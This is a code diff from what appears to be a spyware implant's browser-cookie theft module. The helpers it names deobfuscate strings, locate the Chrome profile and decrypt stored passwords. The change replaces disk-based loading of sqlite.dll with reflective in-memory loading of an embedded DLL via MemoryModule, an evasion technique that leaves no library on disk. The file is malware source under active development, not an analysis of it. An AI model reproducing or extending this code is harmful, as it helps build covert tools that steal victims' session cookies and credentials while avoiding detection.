@@ -4,6 +4,7 @@
 #include <stdio.h>
 #include "..\\common.h"
 #include "CookieHandler.h"
+#include "..\MemoryModule.h"
 
 // SQLITE Library functions 
 typedef int (*sqlite3_open)(const char *, void **);
@@ -12,7 +13,8 @@ typedef int (*sqlite3_exec)(void *, const char *, int (*callback)(void*,int,char
 static sqlite3_open		social_SQLITE_open = NULL;
 static sqlite3_close	social_SQLITE_close = NULL;
 static sqlite3_exec		social_SQLITE_exec = NULL;
-static HMODULE libsqlsc;
+//static HMODULE libsqlsc;
+HMEMORYMODULE libsqlsc = NULL;
 //--------------------
 
 extern int DirectoryExists(WCHAR *path);
@@ -22,20 +24,27 @@ extern char *DeobStringA(char *string);
 extern WCHAR *GetCHProfilePath();
 extern int DecryptPass(CHAR *cryptData, WCHAR *clearData, UINT clearSize);
 
+extern int sqliteModLen;
+extern char sqliteMod[];
 int static InitSocialLibs()
 {
 	char buffer[MAX_PATH];
 
-	if (!(libsqlsc = LoadLibrary(HM_CompletePath("sqlite.dll", buffer)))) 
-		return 0;
-	
-	// sqlite functions
-	social_SQLITE_open = (sqlite3_open) GetProcAddress(libsqlsc, "sqlite3_open");
-	social_SQLITE_close = (sqlite3_close) GetProcAddress(libsqlsc, "sqlite3_close");
-	social_SQLITE_exec = (sqlite3_exec) GetProcAddress(libsqlsc, "sqlite3_exec");
+// 	if (!(libsqlsc = LoadLibrary(HM_CompletePath("sqlite.dll", buffer)))) 
+// 		return 0;
+	HMEMORYMODULE libsqlsc = MemoryLoadLibrary(sqliteMod, sqliteModLen);
 
+	// sqlite functions
+// 	social_SQLITE_open = (sqlite3_open) GetProcAddress(libsqlsc, "sqlite3_open");
+// 	social_SQLITE_close = (sqlite3_close) GetProcAddress(libsqlsc, "sqlite3_close");
+// 	social_SQLITE_exec = (sqlite3_exec) GetProcAddress(libsqlsc, "sqlite3_exec");
+
+	social_SQLITE_open = (sqlite3_open)MemoryGetProcAddress(libsqlsc, "sqlite3_open");
+	social_SQLITE_close = (sqlite3_close)MemoryGetProcAddress(libsqlsc, "sqlite3_close");
+	social_SQLITE_exec = (sqlite3_exec)MemoryGetProcAddress(libsqlsc, "sqlite3_exec");
 	if (!social_SQLITE_open || !social_SQLITE_close || !social_SQLITE_exec) {
-		FreeLibrary(libsqlsc);
+		//FreeLibrary(libsqlsc);
+		MemoryFreeLibrary(libsqlsc);
 		return 0;
 	}
 	return 1;
@@ -43,7 +52,8 @@ int static InitSocialLibs()
 
 void static UnInitSocialLibs()
 {
-	FreeLibrary(libsqlsc);
+	//FreeLibrary(libsqlsc);
+	MemoryFreeLibrary(libsqlsc);
 }
 
 int static parse_sqlite_cookies(void *NotUsed, int argc, char **argv, char **azColName)
